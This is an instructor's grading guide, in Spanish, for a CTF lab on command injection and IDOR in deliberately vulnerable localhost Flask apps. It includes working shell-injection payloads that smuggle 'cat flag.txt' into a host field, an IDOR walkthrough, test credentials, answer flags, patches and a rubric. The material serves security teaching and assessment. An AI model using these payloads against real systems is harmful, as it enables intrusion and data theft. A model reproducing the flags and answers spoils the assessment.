# Guía del Evaluador — Lab5 CTF (Sustentación Práctica, 15 min/grupo)

Esta guía es de uso exclusivo del evaluador/profesor. Contiene las
flags, credenciales, payloads y parches de referencia para calificar
rápidamente cada sustentación. **No compartir este archivo con los
estudiantes antes de su sustentación.**

Antes de cada grupo, ejecutar desde la raíz del repositorio:

```bash
./reset.sh
```

para garantizar que ambos retos arrancan en estado vulnerable.

---

## 1. Distribución estricta del tiempo (15 minutos por grupo)

| Tiempo | Fase | Qué debe mostrar el grupo |
|---|---|---|
| **Min 0–5** | **Fase Ofensiva** | Explotar la vulnerabilidad de **al menos uno** de los dos retos (idealmente ambos si el tiempo lo permite) y obtener la **Flag 1**. Debe explicar en voz alta *por qué* el payload funciona. |
| **Min 5–10** | **Fase Defensiva** | Editar `app.py` desde la terminal web (ttyd) aplicando el parche correspondiente, **repetir la misma petición/payload** usada en la fase ofensiva y demostrar que ya no funciona (mitigación en vivo, sin reiniciar el contenedor). |
| **Min 10–15** | **Verificación en vivo + pregunta teórica** | El evaluador repite una variante del payload (no idéntica) para confirmar que el parche es robusto y no solo "hardcodeado". Luego se hace **1 pregunta teórica** sobre impacto/riesgo residual (ver banco de preguntas abajo). |

Recomendación de manejo de tiempo: avisar al grupo cuando quede 1
minuto de cada fase. Si al minuto 5 no han obtenido la flag ofensiva,
dar una pista adicional (ver cheatsheets) y continuar — no detener la
sustentación completa por esto, pero penalizar en la rúbrica.

---

## 2. Cheatsheet — Reto 1: Command Injection (DMZ.10)

**Acceso:** App `http://localhost:5001` · Terminal `http://localhost:7681`

### Pista a entregar al estudiante (si se traba)
> "La herramienta ejecuta un `ping` real hacia el host que ustedes
> escriben. Piensen en cómo el sistema operativo separa varios
> comandos en una misma línea de terminal (`;`, `&&`, `|`)."

### Payloads ofensivos funcionales
```
127.0.0.1; cat flag.txt
127.0.0.1 && cat flag.txt
127.0.0.1 | cat flag.txt
```

Vía API (si el grupo prefiere `curl`/Postman):
```bash
curl -X POST http://localhost:5001/diagnostic \
     -H "Content-Type: application/json" \
     -d '{"host": "127.0.0.1; cat flag.txt"}'
```

**Flag esperada:** `FLAG{cmd_1nj3ct10n_dmz_byp4ss}`

### Parche defensivo exacto

**Código ANTES (vulnerable)** — en `/app/app.py`:
```python
command = "ping -c 1 " + host
output = os.popen(command).read()
```

**Código DESPUÉS (parcheado)** — reemplazo esperado:
```python
import ipaddress
import re
import subprocess

def es_host_valido(host: str) -> bool:
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return bool(re.fullmatch(r"[A-Za-z0-9.-]{1,253}", host))

if not es_host_valido(host):
    output = "Host inválido"
else:
    resultado = subprocess.run(
        ["ping", "-c", "1", host],
        capture_output=True, text=True, timeout=5,
    )
    output = resultado.stdout + resultado.stderr
```

Puntos clave que el grupo debe mencionar/aplicar (no exige el código
literal, sí la idea):
- Usar `subprocess.run` con **lista de argumentos** (nunca
  `shell=True` ni `os.popen` con concatenación de strings).
- Validar la entrada (regex o `ipaddress`) **antes** de ejecutar el
  comando, rechazando cualquier carácter de metacaracteres de shell.

### Comprobación de que el exploit quedó mitigado
Repetir el mismo payload tras el parche:
```bash
curl -X POST http://localhost:5001/diagnostic \
     -H "Content-Type: application/json" \
     -d '{"host": "127.0.0.1; cat flag.txt"}'
```
- ❌ Antes del parche: la respuesta incluye `FLAG{cmd_1nj3ct10n_dmz_byp4ss}`.
- ✅ Después del parche: la respuesta debe mostrar `"Host inválido"`
  (o un ping normal si el payload es solo `127.0.0.1`), **sin**
  evidencia del contenido de `flag.txt`.

Variante de verificación del evaluador (min 10–15), para descartar un
parche "hardcodeado" contra el payload exacto:
```
127.0.0.1;cat flag.txt
127.0.0.1`cat flag.txt`
```

---

## 3. Cheatsheet — Reto 2: IDOR / Broken Access Control

**Acceso:** App `http://localhost:5002` · Terminal `http://localhost:7682`

### Pista a entregar al estudiante (si se traba)
> "Inicien sesión como `auditor` y miren la URL de su propio reporte.
> ¿Qué pasa si cambian solo el número al final?"

### Credenciales de usuarios de prueba
| Usuario   | Contraseña          | user_id | Reporte propio |
|-----------|---------------------|---------|-----------------|
| `auditor` | `auditor123`        | 2       | `id=2` (normal) |
| `admin`   | `admin_pwd_secret`   | 1       | `id=1` (confidencial, contiene la flag) |

### Explotación esperada
1. Login como `auditor` / `auditor123` → redirige a `/report?id=2`.
2. Cambiar manualmente la URL a `/report?id=1` (o `GET /api/report/1`
   con la cookie de sesión de `auditor`).
3. El sistema muestra el reporte confidencial del admin sin validar
   propiedad.

**Flag esperada:** `FLAG{1d0r_br0k3n_4cc3ss_c0ntr0l}`

### Parche defensivo exacto

**Código ANTES (vulnerable)** — en `/app/app.py`, función `report()`
(y análogamente en `api_report()`):
```python
row = conn.execute("SELECT * FROM reports WHERE id = ?", (report_id,)).fetchone()
conn.close()

if row is None:
    return "Reporte no encontrado", 404

return render_template("report.html", report=row, username=session["username"])
```

**Código DESPUÉS (parcheado)**:
```python
from flask import abort

row = conn.execute("SELECT * FROM reports WHERE id = ?", (report_id,)).fetchone()
conn.close()

if row is None:
    return "Reporte no encontrado", 404

if row["user_id"] != session.get("user_id"):
    return abort(403)

return render_template("report.html", report=row, username=session["username"])
```

Mismo cambio debe aplicarse en `/api/report/<id>` (comparando
`row["user_id"]` contra `session.get("user_id")` antes de devolver el
JSON).

### Comprobación de que responde 403 Forbidden
Con sesión de `auditor` activa, tras el parche:
```bash
curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt "http://localhost:5002/report?id=1"
curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt "http://localhost:5002/api/report/1"
```
- ❌ Antes del parche: `200` y el contenido con la flag.
- ✅ Después del parche: **`403`** en ambos endpoints.

Verificar además que **no se rompió** el acceso legítimo:
```bash
curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt "http://localhost:5002/report?id=2"
```
Debe seguir devolviendo `200` (el auditor sigue viendo su propio
reporte).

---

## 4. Criterio de calificación (escala discreta 0 / 2.5 / 5.0)

La nota se da **por reto**, en tres valores únicos posibles: **0**,
**2.5** o **5.0**. No hay puntos intermedios: cada hito o se logra
completo o no cuenta. Esto corresponde 1 a 1 con las fases de tiempo
de la sección 1 (0–5 min → hito de 2.5; 5–15 min → hito de 5.0).

Esta misma tabla (sin las columnas de "evidencia interna del
evaluador") está publicada para los estudiantes en
[`RUBRICA_ESTUDIANTE.md`](./RUBRICA_ESTUDIANTE.md) — pueden conocerla
de antemano, ya que no revela flags, payloads ni parches.

### Reto 1 — Command Injection

| Nota | Se otorga cuando... | Cómo lo confirma el evaluador |
|---|---|---|
| **0** | El grupo no logra que el servidor ejecute un comando distinto al `ping` esperado (no obtiene la Flag 1) al terminar el min 5. | No aparece `FLAG{cmd_1nj3ct10n_dmz_byp4ss}` en la respuesta, ni con ayuda de la pista. |
| **2.5** | El grupo logra la inyección, obtiene la Flag 1 **y** explica correctamente por qué ocurre (concatenación de strings ejecutada con `shell=True`/`os.popen`). | Flag visible en pantalla + explicación verbal coherente con el cheatsheet (sección 2). |
| **5.0** | Además de lo anterior: aplica en vivo el parche (`subprocess.run` con lista de argumentos + validación de entrada), el payload original **y** la variante del evaluador (min 10–15) ya no filtran la flag, el ping legítimo (`127.0.0.1`) sigue funcionando, y responde bien la pregunta teórica. | Repetir payload original → sin flag. Repetir variante (`` `cat flag.txt` `` o similar) → sin flag. `127.0.0.1` normal → responde ping. Pregunta teórica → respuesta correcta. |

Nota intermedia (p. ej. parche que rompe el ping legítimo, o que solo
bloquea el payload exacto pero cae con la variante): se queda en
**2.5**, no se promedia a 3.75 ni 1.25 — la escala es estrictamente
{0, 2.5, 5.0}.

### Reto 2 — IDOR / Broken Access Control

| Nota | Se otorga cuando... | Cómo lo confirma el evaluador |
|---|---|---|
| **0** | El grupo no logra acceder al reporte de otro usuario (no obtiene la Flag 1) al terminar el min 5. | No aparece `FLAG{1d0r_br0k3n_4cc3ss_c0ntr0l}`, ni con ayuda de la pista. |
| **2.5** | El grupo se autentica, cambia el identificador del recurso, obtiene la Flag 1 **y** explica correctamente por qué ocurre (falta de verificación de propiedad del recurso: autenticación ≠ autorización). | Flag visible en pantalla (vía `/report?id=1` o `/api/report/1`) + explicación verbal coherente con el cheatsheet (sección 3). |
| **5.0** | Además de lo anterior: aplica en vivo el parche de autorización (`abort(403)` comparando `user_id`), tanto el acceso original **como** la variante del evaluador devuelven **403** en ambos endpoints (`/report` y `/api/report/<id>`), el acceso al reporte propio (`id=2`) sigue devolviendo `200`, y responde bien la pregunta teórica. | `curl .../report?id=1` → `403`. `curl .../api/report/1` → `403`. `curl .../report?id=2` → `200`. Pregunta teórica → respuesta correcta. |

Nota intermedia (p. ej. parche aplicado solo en `/report` pero no en
`/api/report/<id>`, o que rompe el acceso al reporte propio): se queda
en **2.5**.

### Nota final de la sustentación

Si el curso evalúa **ambos retos** en los 15 minutos, la nota final es
el **promedio simple** de las dos notas de reto. Como cada una ya es
0, 2.5 o 5.0, los únicos resultados posibles del promedio son:

| Reto 1 | Reto 2 | Nota final |
|---|---|---|
| 0 | 0 | 0 |
| 0 | 2.5 / 2.5 | 0 |
| 2.5 | 2.5 | 2.5 |
| 0 | 5.0 | 2.5 |
| 2.5 | 5.0 | 3.75* |
| 5.0 | 5.0 | 5.0 |

\*Si el curso exige que la nota final también sea estrictamente {0,
2.5, 5.0}, redondear 3.75 hacia abajo a **2.5** (criterio conservador:
exige el nivel más alto en ambos retos para llegar a 5.0). Ajustar
este criterio de redondeo antes de la primera sustentación y
comunicarlo al grupo.

Si el curso evalúa **un solo reto** por grupo (por restricción de
tiempo), la nota final es directamente la nota de ese reto (0, 2.5 o
5.0).

### Banco de preguntas teóricas sugeridas (elegir 1 por grupo)
- Reto 1: "¿Por qué `subprocess.run` con lista de argumentos es seguro
  aunque la cadena siga conteniendo `;` o `&&`?" (Respuesta esperada:
  porque no se invoca un shell intermedio que interprete
  metacaracteres; el argumento se pasa literal al binario `ping`.)
- Reto 1: "Si solo se hiciera un filtro de palabras prohibidas (blacklist
  de `;`, `&&`, etc.) en vez de usar `subprocess.run` con lista, ¿qué
  riesgo residual quedaría?" (Bypass con backticks, `$()`, saltos de
  línea, codificación, etc.)
- Reto 2: "¿Por qué validar solo la autenticación (`session['user_id']`
  existe) no es suficiente para prevenir IDOR?" (Autenticación ≠
  autorización; falta verificar propiedad/relación del recurso con el
  usuario.)
- Reto 2: "¿Qué otros recursos de esta aplicación podrían tener el
  mismo problema si no se corrige de forma centralizada?" (Cualquier
  endpoint que reciba un ID de recurso por parámetro: facturas,
  perfiles, archivos, etc. — importancia de una capa de autorización
  reutilizable en vez de parches puntuales.)
